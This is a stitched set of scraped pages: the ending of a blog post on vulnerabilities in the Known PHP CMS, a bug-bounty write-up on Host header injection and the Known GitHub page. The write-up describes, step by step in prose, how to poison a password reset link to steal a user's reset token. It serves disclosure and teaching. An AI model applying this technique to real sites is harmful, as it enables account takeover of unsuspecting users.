Source code security auditing is definitely no child’s game. It takes time and helluva lot of patience. I think I got lucky with some of the vulnerabilities above but still I toiled for some of the others. In the end, it was a very rewarding experience and one which will definitely come handy if I get an AppSec job. Now, once I get an Infosec job, the first thing I’m going to do is thank that C# recruiter for his *simple* test. Sometimes simple things in life can go a long way. It’s almost 5 AM in the morning here and I’m giving my finishing touch to this blog post. Hope, someone finds this useful. And as always, thanks for reading. Peace!

Posted in [Advisories](https://blog.jitendrapatro.me/category/writeups/advisories/), [CVE writeups](https://blog.jitendrapatro.me/category/writeups/advisories/cve-writeups/), [Writeups](https://blog.jitendrapatro.me/category/writeups/)Tagged [Account Takeover](https://blog.jitendrapatro.me/tag/account-takeover/), [CMS](https://blog.jitendrapatro.me/tag/cms/), [code](https://blog.jitendrapatro.me/tag/code/), [CVE](https://blog.jitendrapatro.me/tag/cve/), [IDOR](https://blog.jitendrapatro.me/tag/idor/), [MITRE](https://blog.jitendrapatro.me/tag/mitre/), [OWASP](https://blog.jitendrapatro.me/tag/owasp/), [php](https://blog.jitendrapatro.me/tag/php/), [Security](https://blog.jitendrapatro.me/tag/security/), [vulnerability](https://blog.jitendrapatro.me/tag/vulnerability/), [XSS](https://blog.jitendrapatro.me/tag/xss/)

![](https://secure.gravatar.com/avatar/aa6faff3745625521ed8f3e74dea1624?s=80&d=mm&r=g)
## Published by Phoenix

[View all posts by Phoenix](https://blog.jitendrapatro.me/author/ab3tt0r/)

## Post navigation

[Prev Deploying a Shadowsocks Server to GCP using Terraform](https://blog.jitendrapatro.me/deploying-a-shadowsocks-server-to-gcp-using-terraform/)[Next CVE-2022-33994:- Stored XSS in WordPress](https://blog.jitendrapatro.me/cve-2022-33994-stored-xss-in-wordpress/)

## 4 Replies to “Multiple Vulnerabilities in Idno – Known PHP CMS software”

1. ![](https://secure.gravatar.com/avatar/283574669fd324f7cb571ba8c0a4194f?s=68&d=mm&r=g) **Percy Andrew** says:
   [September 20, 2022 at 3:16 PM](https://blog.jitendrapatro.me/multiple-vulnerabilities-in-idno-known-php-cms-software/#comment-27)

   It’s perfect time to makе a few plans fоr the longer term аnd it is

   time to be happy. I’ve read this post and I would say you make some interesting issues οr suggestions.

   Μaybe yoս can write subsequent articles regаrding tһis article.

   I ᴡish to гead even more things aboսt it!

   [Reply](https://blog.jitendrapatro.me/multiple-vulnerabilities-in-idno-known-php-cms-software/?replytocom=27#respond)
   1. ![](https://secure.gravatar.com/avatar/aa6faff3745625521ed8f3e74dea1624?s=68&d=mm&r=g) **[Phoenix](https://jitendrapatro.me)** says:
      [September 24, 2022 at 12:58 PM](https://blog.jitendrapatro.me/multiple-vulnerabilities-in-idno-known-php-cms-software/#comment-28)

      Thanks. I’ve plans to write similar articles in the future.

      [Reply](https://blog.jitendrapatro.me/multiple-vulnerabilities-in-idno-known-php-cms-software/?replytocom=28#respond)
3. ![](https://secure.gravatar.com/avatar/78a82fc310f74fc8554df9b2576184fb?s=68&d=mm&r=g) **Chelsey** says:
   [July 10, 2022 at 3:30 PM](https://blog.jitendrapatro.me/multiple-vulnerabilities-in-idno-known-php-cms-software/#comment-21)

   There is no version 1.3.1, where did you get to see that version?

   [Reply](https://blog.jitendrapatro.me/multiple-vulnerabilities-in-idno-known-php-cms-software/?replytocom=21#respond)
   1. ![](https://secure.gravatar.com/avatar/aa6faff3745625521ed8f3e74dea1624?s=68&d=mm&r=g) **[Phoenix](https://jitendrapatro.me)** says:
      [July 10, 2022 at 7:06 PM](https://blog.jitendrapatro.me/multiple-vulnerabilities-in-idno-known-php-cms-software/#comment-22)

      It’s the dev version that is supported by security updates according to their [security policy.](https://github.com/idno/known/security/policy)

      [Reply](https://blog.jitendrapatro.me/multiple-vulnerabilities-in-idno-known-php-cms-software/?replytocom=22#respond)

### Leave a Reply [Cancel reply](/multiple-vulnerabilities-in-idno-known-php-cms-software/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

 Save my name, email, and website in this browser for the next time I comment.

## About The Blog

I created this blog to share the knowledge I've gained over the years and things that I'm yet to learn. Presently, my posts will be mainly focused on Open Source software, Information Security and Hacking. Happy Learning!

## Recent Posts

* [OWASP Android UnCrackable Level 2](https://blog.jitendrapatro.me/owasp-android-uncrackable-level-2/)
* [OWASP Android UnCrackable Level 1](https://blog.jitendrapatro.me/owasp-android-uncrackable-level-1/)
* [Project: Wireless Hacks!](https://blog.jitendrapatro.me/project-wireless-hacks/)
* [Emulating AARCH64(ARM64) with QEMU – Part 1](https://blog.jitendrapatro.me/emulating-aarch64arm64-with-qemu-part-1/)
* [ModSecurity with OWASP CRS – Part 1: Installation](https://blog.jitendrapatro.me/installing-modsecurity-web-application-firewall/)
* [CVE-2022-33012:- Account Takeover Through Password Reset Poisoning](https://blog.jitendrapatro.me/cve-2022-33012-account-takeover-through-password-reset-poisoning/)
* [CVE-2022-33994:- Stored XSS in WordPress](https://blog.jitendrapatro.me/cve-2022-33994-stored-xss-in-wordpress/)

## Archives

* [2023](https://blog.jitendrapatro.me/2023/)
* [2022](https://blog.jitendrapatro.me/2022/)
* [2021](https://blog.jitendrapatro.me/2021/)

## Categories

* [Advisories](https://blog.jitendrapatro.me/category/writeups/advisories/)
* [Android](https://blog.jitendrapatro.me/category/writeups/android/)
* [CVE writeups](https://blog.jitendrapatro.me/category/writeups/advisories/cve-writeups/)
* [HW Hacks](https://blog.jitendrapatro.me/category/writeups/hardware-hacks/)
* [ModSecurity](https://blog.jitendrapatro.me/category/writeups/modsecurity/)
* [PHP Basic](https://blog.jitendrapatro.me/category/writeups/secure-code-warrior/php-basic/)
* [Projects](https://blog.jitendrapatro.me/category/projects/)
* [Radio/Satellite Hacks](https://blog.jitendrapatro.me/category/writeups/radio-satellite-hacks/)
* [Secure Code Warrior](https://blog.jitendrapatro.me/category/writeups/secure-code-warrior/)
* [Tutorials](https://blog.jitendrapatro.me/category/tutorials-and-guides/)
* [Writeups](https://blog.jitendrapatro.me/category/writeups/)

## Tags

[aarch64](https://blog.jitendrapatro.me/tag/aarch64/)
[access control](https://blog.jitendrapatro.me/tag/access-control/)
[Account Takeover](https://blog.jitendrapatro.me/tag/account-takeover/)
[algorithm](https://blog.jitendrapatro.me/tag/algorithm/)
[Android](https://blog.jitendrapatro.me/tag/android/)
[apache](https://blog.jitendrapatro.me/tag/apache/)
[Bitwarden](https://blog.jitendrapatro.me/tag/bitwarden/)
[C](https://blog.jitendrapatro.me/tag/c-2/)
[CMS](https://blog.jitendrapatro.me/tag/cms/)
[code](https://blog.jitendrapatro.me/tag/code/)
[Core Rule Set](https://blog.jitendrapatro.me/tag/core-rule-set/)
[CVE](https://blog.jitendrapatro.me/tag/cve/)
[Debian](https://blog.jitendrapatro.me/tag/debian/)
[dns](https://blog.jitendrapatro.me/tag/dns/)
[docker](https://blog.jitendrapatro.me/tag/docker/)
[emulation](https://blog.jitendrapatro.me/tag/emulation/)
[first post](https://blog.jitendrapatro.me/tag/first-post/)
[Frida](https://blog.jitendrapatro.me/tag/frida/)
[gcloud cli](https://blog.jitendrapatro.me/tag/gcloud-cli/)
[git](https://blog.jitendrapatro.me/tag/git/)
[Google Cloud](https://blog.jitendrapatro.me/tag/google-cloud/)
[HCL](https://blog.jitendrapatro.me/tag/hcl/)
[HTTP Headers](https://blog.jitendrapatro.me/tag/http-headers/)
[IDOR](https://blog.jitendrapatro.me/tag/idor/)
[injection](https://blog.jitendrapatro.me/tag/injection/)
[installing-openvpn-as](https://blog.jitendrapatro.me/tag/installing-openvpn-as/)
[iptables](https://blog.jitendrapatro.me/tag/iptables/)
[Java](https://blog.jitendrapatro.me/tag/java/)
[JavaScript](https://blog.jitendrapatro.me/tag/javascript/)
[Linode](https://blog.jitendrapatro.me/tag/linode/)
[Linux](https://blog.jitendrapatro.me/tag/linux/)
[mail](https://blog.jitendrapatro.me/tag/mail/)
[MITRE](https://blog.jitendrapatro.me/tag/mitre/)
[MobSF](https://blog.jitendrapatro.me/tag/mobsf/)
[mysql](https://blog.jitendrapatro.me/tag/mysql/)
[Networking](https://blog.jitendrapatro.me/tag/networking/)
[nextcloud](https://blog.jitendrapatro.me/tag/nextcloud/)
[Open Source](https://blog.jitendrapatro.me/tag/opensource/)
[openvpn](https://blog.jitendrapatro.me/tag/openvpn/)
[OpenVPN 3](https://blog.jitendrapatro.me/tag/openvpn-3/)
[ovpn-dco](https://blog.jitendrapatro.me/tag/ovpn-dco/)
[OWASP](https://blog.jitendrapatro.me/tag/owasp/)
[pagespeed](https://blog.jitendrapatro.me/tag/pagespeed/)
[password manager](https://blog.jitendrapatro.me/tag/password-manager/)
[path traversal](https://blog.jitendrapatro.me/tag/path-traversal/)
[performance](https://blog.jitendrapatro.me/tag/performance/)
[php](https://blog.jitendrapatro.me/tag/php/)
[php-fpm](https://blog.jitendrapatro.me/tag/php-fpm/)
[postfix](https://blog.jitendrapatro.me/tag/postfix/)
[Project](https://blog.jitendrapatro.me/tag/project/)
[proxy](https://blog.jitendrapatro.me/tag/proxy/)
[QEMU](https://blog.jitendrapatro.me/tag/qemu/)
[Radio](https://blog.jitendrapatro.me/tag/radio/)
[restricting-ssh](https://blog.jitendrapatro.me/tag/restricting-ssh/)
[rootless docker](https://blog.jitendrapatro.me/tag/rootless-docker/)
[securing-ssh](https://blog.jitendrapatro.me/tag/securing-ssh/)
[Security](https://blog.jitendrapatro.me/tag/security/)
[security misconfig](https://blog.jitendrapatro.me/tag/security-misconfig/)
[sensitive data exposure](https://blog.jitendrapatro.me/tag/sensitive-data-exposure/)
[Shadowsocks](https://blog.jitendrapatro.me/tag/shadowsocks/)
[SMIL](https://blog.jitendrapatro.me/tag/smil/)
[sql](https://blog.jitendrapatro.me/tag/sql/)
[ssh](https://blog.jitendrapatro.me/tag/ssh/)
[ssl](https://blog.jitendrapatro.me/tag/ssl/)
[sslh](https://blog.jitendrapatro.me/tag/sslh/)
[sslh-proxy](https://blog.jitendrapatro.me/tag/sslh-proxy/)
[su](https://blog.jitendrapatro.me/tag/su/)
[sudo](https://blog.jitendrapatro.me/tag/sudo/)
[SVG](https://blog.jitendrapatro.me/tag/svg/)
[Terraform](https://blog.jitendrapatro.me/tag/terraform/)
[transparent-sslh](https://blog.jitendrapatro.me/tag/transparent-sslh/)
[two-factor-auth](https://blog.jitendrapatro.me/tag/two-factor-auth/)
[ubuntu](https://blog.jitendrapatro.me/tag/ubuntu/)
[virtualization](https://blog.jitendrapatro.me/tag/virtualization/)
[vulnerability](https://blog.jitendrapatro.me/tag/vulnerability/)
[WAF](https://blog.jitendrapatro.me/tag/waf/)
[webserver](https://blog.jitendrapatro.me/tag/webserver/)
[WordPress](https://blog.jitendrapatro.me/tag/wordpress/)
[XSS](https://blog.jitendrapatro.me/tag/xss/)

## Contact Me

* [GitHub](https://github.com/JitPatro)
* [LinkedIn](https://www.linkedin.com/in/jitendrapatro)
* Mail
* [GitHub](https://github.com/Xhoenix)

© 2024 Jitendra Patro.

↑↑


=== Content from www.pethuraj.com_3cec04b8_20250108_125211.html ===

[Skip to content](#content)
Pethuraj's Blog

## Recent Posts

* [How to use Burp Suite Like a PRO? PART – 1](https://www.pethuraj.com/blog/use-burpsuite-like-a-pro-part-1/)
* [Houzz – SSRF Vulnerability Bugbounty Writeup](https://www.pethuraj.com/blog/houzz-ssrf-vulnerability-bugbounty-writeup/)
* [Cyfe.com – CSRF Vulnerability Writeup](https://www.pethuraj.com/blog/cyfe-csrf-vulnerability-writeup/)
* [United Nations IDOR Vulnerability Writeup](https://www.pethuraj.com/blog/united-nations-bugbounty-writeup/)
* [Escalating XSS to Arbitrary File Read](https://www.pethuraj.com/blog/escalating-xss-to-arbitrary-file-read/)

## Most Used Categories

* [Uncategorized](https://www.pethuraj.com/blog/category/uncategorized/) (6)
* [XSS](https://www.pethuraj.com/blog/category/xss/) (3)
* [Arbitrary File Read](https://www.pethuraj.com/blog/category/arbitrary-file-read/) (1)
* [IDOR](https://www.pethuraj.com/blog/category/idor/) (1)
* [CSRF](https://www.pethuraj.com/blog/category/csrf/) (1)
* [SSRF](https://www.pethuraj.com/blog/category/ssrf/) (1)
* [Burp Suite](https://www.pethuraj.com/blog/category/burp-suite/) (1)

# [Pethuraj's Blog](https://www.pethuraj.com/blog/)

Bug Bounty Writeups

* [About Me](https://www.pethuraj.com)

![](https://www.pethuraj.com/blog/wp-content/uploads/2020/09/host-header.png)

[Uncategorized](https://www.pethuraj.com/blog/category/uncategorized/)
# How I earned $800 for Host Header Injection Vulnerability

[15/03/202025/05/2021](https://www.pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/) by [admin](https://www.pethuraj.com/blog/author/admin/)

HTTP response header injection vulnerabilities arise when user-supplied data is reflected into a response header in an unsafe way.

The host header specifies which website or web application should process an incoming HTTP request. Host header attack possible, an attacker can manipulate the Host header as seen by the web application and cause the application to behave in unexpected ways.

The Host header determines which site an web application should process an approaching HTTP request.

They pose many risks and induce various attack vectors namely
⦁ password reset poisoning / invite feature poisoning
⦁ cache poisoning
⦁ access to other internal host/application
⦁ XSS, etc.

TIP

If the website works with an arbitrary host header, the client can modify the host header to contain anything. This can introduce a security issue if the host header is then used within the application.

Attack Scenario:

⦁ The attacker sends a reset password request to another user by modifying the Host Header in the request with any malicious site.
⦁ The user receives an email to reset the password, clicks the link and proceeds further with the malicious link.
⦁ By this way, an attacker can obtain valid password reset token for any user.

I found this vulnerability on a private program on Bugcrowd platform. I started to test for vulnerabilities such as XSS, CSRF, etc. Interestingly the application accepts arbitrary Host Header and so I decided to test for Cache Poisoning on the Password reset endpoint.

I’ve explained below on how to reproduce Host Header Injection to poison the Password Reset link and to take over accounts.

Writeup

The password reset page looks like this.

![](https://www.pethuraj.com/blog/wp-content/uploads/2020/09/password-reset.png)

Now, just type the email to reset the password and fire up Burp Suite to intercept the traffic and click Reset Password.

* ![](https://www.pethuraj.com/blog/wp-content/uploads/2020/09/password-reset-burp-1-1024x475.png)

Now on the Burp Suite, capture the request and change the HTTP Request Header Host parameter from the original URL to any site you wish. I’ve used google.com as example below.

Now when you analyse the above screenshot, the Host header is changed to a malicious site, forward the request and when the request been passed, the attack triggers.

An email containing the password reset link will be sent to the user.

![](https://www.pethuraj.com/blog/wp-content/uploads/2020/09/password-reset-link-sent-successfully-1024x192.png)

As you can see, the received password reset link has been sent containing the Poisoned password reset link.

![](https://www.pethuraj.com/blog/wp-content/uploads/2020/09/successful-Password-reset-link.jpg)

This allowed me to steal the user’s password reset token.

For reporting this vulnerability sensibly, I’ve been awarded with $800 💰

References:

[https://portswigger.net/kb/issues/00200200\_http-response-header-injection](https://portswigger.net/kb/issues/00200200_http-response-header-injectionhttps%3A//www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/)

[https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/](https://portswigger.net/kb/issues/00200200_http-response-header-injectionhttps%3A//www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/)

Thanks for reading this article. Stay tuned for more Bug bounty & Pentesting tutorials!

### **You may like**

[![burp suite advanced tutorials](https://www.pethuraj.com/blog/wp-content/uploads/2022/07/Mastering-Burp-suite-300x150.png)](https://www.pethuraj.com/blog/use-burpsuite-like-a-pro-part-1/)
#### [How to use Burp Suite Like a PRO? PART – 1](https://www.pethuraj.com/blog/use-burpsuite-like-a-pro-part-1/)

This blog series is an advanced tutorial of the popular web application security and penetration testing tool Burp Suite, to help ...

[![houzz bug bounty writeup](https://www.pethuraj.com/blog/wp-content/uploads/2021/10/houzz-300x150.png)](https://www.pethuraj.com/blog/houzz-ssrf-vulnerability-bugbounty-writeup/)
#### [Houzz – SSRF Vulnerability Bugbounty Writeup](https://www.pethuraj.com/blog/houzz-ssrf-vulnerability-bugbounty-writeup/)

Hello Infosec folks, here is a new and interesting writeup for you all. It’s about how I found Server Side ...

Share on Social Media[x](https://twitter.com/share?url=https://www.pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/&text=How+I+earned+%24800+for+Host+Header+Injection+Vulnerability) [facebook](https://www.facebook.com/sharer.php?u=https://www.pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/)[linkedin](https://www.linkedin.com/shareArticle?url=https://www.pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/&title=How+I+earned+%24800+for+Host+Header+Injection+Vulnerability)[email](/cdn-cgi/l/email-protection#6c531f190e06090f185124031b472547090d1e02090847495e58545c5c470a031e4724031f184724090d08091e47250206090f18050302473a190002091e0d0e05000518154a4f5c5f54570e030815510418181c1f5643431b1b1b421c091804191e0d06420f0301430e00030b4304031b410541090d1e02090841545c5c410a031e4104031f184104090d08091e41050206090f18050302411a190002091e0d0e050005181543)[whatsapp](https://api.whatsapp.com/send?text=How+I+earned+%24800+for+Host+Header+Injection+Vulnerability%20https://www.pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/)

## Post navigation

[$3133.7 Google Bug Bounty Writeup- XSS Vulnerability!](https://www.pethuraj.com/blog/google-bug-bounty-writeup/)

## Recent Posts

* [How to use Burp Suite Like a PRO? PART – 1](https://www.pethuraj.com/blog/use-burpsuite-like-a-pro-part-1/)
* [Houzz – SSRF Vulnerability Bugbounty Writeup](https://www.pethuraj.com/blog/houzz-ssrf-vulnerability-bugbounty-writeup/)
* [Cyfe.com – CSRF Vulnerability Writeup](https://www.pethuraj.com/blog/cyfe-csrf-vulnerability-writeup/)
* [United Nations IDOR Vulnerability Writeup](https://www.pethuraj.com/blog/united-nations-bugbounty-writeup/)
* [Escalating XSS to Arbitrary File Read](https://www.pethuraj.com/blog/escalating-xss-to-arbitrary-file-read/)

## Tags

[Host Header Injection](https://www.pethuraj.com/blog/tag/host-header-injection/)[BruteForce](https://www.pethuraj.com/blog/tag/bruteforce/)[Arbitrary File Read](https://www.pethuraj.com/blog/tag/arbitrary-file-read/)[IDOR](https://www.pethuraj.com/blog/tag/idor/)[csrf](https://www.pethuraj.com/blog/tag/csrf/)[SSRF](https://www.pethuraj.com/blog/tag/ssrf/)[Burp Suite](https://www.pethuraj.com/blog/tag/burp-suite/)[Open Redirect](https://www.pethuraj.com/blog/tag/open-redirect/)[XSS](https://www.pethuraj.com/blog/tag/xss/)

## You may like

[![Paypal Bug Bounty writeup](https://www.pethuraj.com/blog/wp-content/uploads/2021/03/Paypal-BugBounty.png)](https://www.pethuraj.com/blog/paypal-bug-bounty-writeup/)

## [How I made to Paypal Bug Bounty $750](https://www.pethuraj.com/blog/paypal-bug-bounty-writeup/)

28/03/2021

[![BMW Bug Bounty Writeup](https://www.pethuraj.com/blog/wp-content/uploads/2021/01/BMW-Bug-Bounty-Writeup.png)](https://www.pethuraj.com/blog/bmw-bugbounty-writeup/)

## [BMW Bug Bounty – Account Verification Bypass writeup](https://www.pethuraj.com/blog/bmw-bugbounty-writeup/)

26/01/2021

## Follow Me

* [linkedin](https://www.linkedin.com/in/pethu/ "Linkedin")
* [twitter](https://twitter.com/Pethuraj "X (ex Twitter)")

© All Rights Reserved 2024 Theme: Prefer by [Template Sell](http://www.templatesell.com/).



=== Content from github.com_09d59084_20250108_125210.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fidno%2Fknown)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fidno%2Fknown)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=idno%2Fknown)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[idno](/idno)
/
**[known](/idno/known)**
Public

* [Notifications](/login?return_to=%2Fidno%2Fknown) You must be signed in to change notification settings
* [Fork
  195](/login?return_to=%2Fidno%2Fknown)
* [Star
   1.1k](/login?return_to=%2Fidno%2Fknown)

A social publishing platform.

[withknown.com/opensource](https://withknown.com/opensource "https://withknown.com/opensource")

### License

[View license](/idno/known/blob/dev/LICENSE)

[1.1k
stars](/idno/known/stargazers) [195
forks](/idno/known/forks) [Branches](/idno/known/branches) [Tags](/idno/known/tags) [Activity](/idno/known/activity)
 [Star](/login?return_to=%2Fidno%2Fknown)

 [Notifications](/login?return_to=%2Fidno%2Fknown) You must be signed in to change notification settings

* [Code](/idno/known)
* [Issues
  136](/idno/known/issues)
* [Pull requests
  7](/idno/known/pulls)
* [Discussions](/idno/known/discussions)
* [Actions](/idno/known/actions)
* [Projects
  0](/idno/known/projects)
* [Security](/idno/known/security)
* [Insights](/idno/known/pulse)

Additional navigation options

* [Code](/idno/known)
* [Issues](/idno/known/issues)
* [Pull requests](/idno/known/pulls)
* [Discussions](/idno/known/discussions)
* [Actions](/idno/known/actions)
* [Projects](/idno/known/projects)
* [Security](/idno/known/security)
* [Insights](/idno/known/pulse)

# idno/known

    dev[Branches](/idno/known/branches)[Tags](/idno/known/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[8,983 Commits](/idno/known/commits/dev/) | | |
| [.github](/idno/known/tree/dev/.github ".github") | | [.github](/idno/known/tree/dev/.github ".github") |  |  |
| [ConsolePlugins](/idno/known/tree/dev/ConsolePlugins "ConsolePlugins") | | [ConsolePlugins](/idno/known/tree/dev/ConsolePlugins "ConsolePlugins") |  |  |
| [Idno](/idno/known/tree/dev/Idno "Idno") | | [Idno](/idno/known/tree/dev/Idno "Idno") |  |  |
| [IdnoPlugins](/idno/known/tree/dev/IdnoPlugins "IdnoPlugins") | | [IdnoPlugins](/idno/known/tree/dev/IdnoPlugins "IdnoPlugins") |  |  |
| [Tests](/idno/known/tree/dev/Tests "Tests") | | [Tests](/idno/known/tree/dev/Tests "Tests") |  |  |
| [Themes](/idno/known/tree/dev/Themes "Themes") | | [Themes](/idno/known/tree/dev/Themes "Themes") |  |  |
| [Uploads](/idno/known/tree/dev/Uploads "Uploads") | | [Uploads](/idno/known/tree/dev/Uploads "Uploads") |  |  |
| [configuration](/idno/known/tree/dev/configuration "configuration") | | [configuration](/idno/known/tree/dev/configuration "configuration") |  |  |
| [css](/idno/known/tree/dev/css "css") | | [css](/idno/known/tree/dev/css "css") |  |  |
| [docker](/idno/known/tree/dev/docker "docker") | | [docker](/idno/known/tree/dev/docker "docker") |  |  |
| [docs](/idno/known/tree/dev/docs "docs") | | [docs](/idno/known/tree/dev/docs "docs") |  |  |
| [gfx](/idno/known/tree/dev/gfx "gfx") | | [gfx](/idno/known/tree/dev/gfx "gfx") |  |  |
| [js](/idno/known/tree/dev/js "js") | | [js](/idno/known/tree/dev/js "js") |  |  |
| [languages](/idno/known/tree/dev/languages "languages") | | [languages](/idno/known/tree/dev/languages "languages") |  |  |
| [statics](/idno/known/tree/dev/statics "statics") | | [statics](/idno/known/tree/dev/statics "statics") |  |  |
| [templates](/idno/known/tree/dev/templates "templates") | | [templates](/idno/known/tree/dev/templates "templates") |  |  |
| [warmup](/idno/known/tree/dev/warmup "warmup") | | [warmup](/idno/known/tree/dev/warmup "warmup") |  |  |
| [.babelrc](/idno/known/blob/dev/.babelrc ".babelrc") | | [.babelrc](/idno/known/blob/dev/.babelrc ".babelrc") |  |  |
| [.dockerignore](/idno/known/blob/dev/.dockerignore ".dockerignore") | | [.dockerignore](/idno/known/blob/dev/.dockerignore ".dockerignore") |  |  |
| [.editorconfig](/idno/known/blob/dev/.editorconfig ".editorconfig") | | [.editorconfig](/idno/known/blob/dev/.editorconfig ".editorconfig") |  |  |
| [.gitignore](/idno/known/blob/dev/.gitignore ".gitignore") | | [.gitignore](/idno/known/blob/dev/.gitignore ".gitignore") |  |  |
| [.htaccess](/idno/known/blob/dev/.htaccess ".htaccess") | | [.htaccess](/idno/known/blob/dev/.htaccess ".htaccess") |  |  |
| [.travis.yml](/idno/known/blob/dev/.travis.yml ".travis.yml") | | [.travis.yml](/idno/known/blob/dev/.travis.yml ".travis.yml") |  |  |
| [CODE\_OF\_CONDUCT.md](/idno/known/blob/dev/CODE_OF_CONDUCT.md "CODE_OF_CONDUCT.md") | | [CODE\_OF\_CONDUCT.md](/idno/known/blob/dev/CODE_OF_CONDUCT.md "CODE_OF_CONDUCT.md") |  |  |
| [CONTRIBUTING.md](/idno/known/blob/dev/CONTRIBUTING.md "CONTRIBUTING.md") | | [CONTRIBUTING.md](/idno/known/blob/dev/CONTRIBUTING.md "CONTRIBUTING.md") |  |  |
| [Gruntfile.js](/idno/known/blob/dev/Gruntfile.js "Gruntfile.js") | | [Gruntfile.js](/idno/known/blob/dev/Gruntfile.js "Gruntfile.js") |  |  |
| [LICENSE](/idno/known/blob/dev/LICENSE "LICENSE") | | [LICENSE](/idno/known/blob/dev/LICENSE "LICENSE") |  |  |
| [README.md](/idno/known/blob/dev/README.md "README.md") | | [README.md](/idno/known/blob/dev/README.md "README.md") |  |  |
| [SECURITY.md](/idno/known/blob/dev/SECURITY.md "SECURITY.md") | | [SECURITY.md](/idno/known/blob/dev/SECURITY.md "SECURITY.md") |  |  |
| [composer.json](/idno/known/blob/dev/composer.json "composer.json") | | [composer.json](/idno/known/blob/dev/composer.json "composer.json") |  |  |
| [composer.lock](/idno/known/blob/dev/composer.lock "composer.lock") | | [composer.lock](/idno/known/blob/dev/composer.lock "composer.lock") |  |  |
| [index.php](/idno/known/blob/dev/index.php "index.php") | | [index.php](/idno/known/blob/dev/index.php "index.php") |  |  |
| [known.php](/idno/known/blob/dev/known.php "known.php") | | [known.php](/idno/known/blob/dev/known.php "known.php") |  |  |
| [mkdocs.yml](/idno/known/blob/dev/mkdocs.yml "mkdocs.yml") | | [mkdocs.yml](/idno/known/blob/dev/mkdocs.yml "mkdocs.yml") |  |  |
| [package.json](/idno/known/blob/dev/package.json "package.json") | | [package.json](/idno/known/blob/dev/package.json "package.json") |  |  |
| [phpunit.xml](/idno/known/blob/dev/phpunit.xml "phpunit.xml") | | [phpunit.xml](/idno/known/blob/dev/phpunit.xml "phpunit.xml") |  |  |
| [version.known](/idno/known/blob/dev/version.known "version.known") | | [version.known](/idno/known/blob/dev/version.known "version.known") |  |  |
| View all files | | |

## Repository files navigation

* README
* Code of conduct
* License
* Security

[![Build Status](https://camo.githubusercontent.com/3f6c9bdfa03f38bbd0284e426fbf7c28feeea73866788aede03d959c0441e5ab/68747470733a2f2f7472617669732d63692e6f72672f69646e6f2f6b6e6f776e2e7376673f6272616e63683d6d6173746572)](https://travis-ci.org/idno/known)
[![Backers on Open Collective](https://camo.githubusercontent.com/6a2fdf1ba7f984481c1d7297dc61c0c8d5a76c2a6a34d59f984dfcc1400f3bf1/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f6b6e6f776e2f6261636b6572732f62616467652e737667)](#backers)

# Known: a social group platform

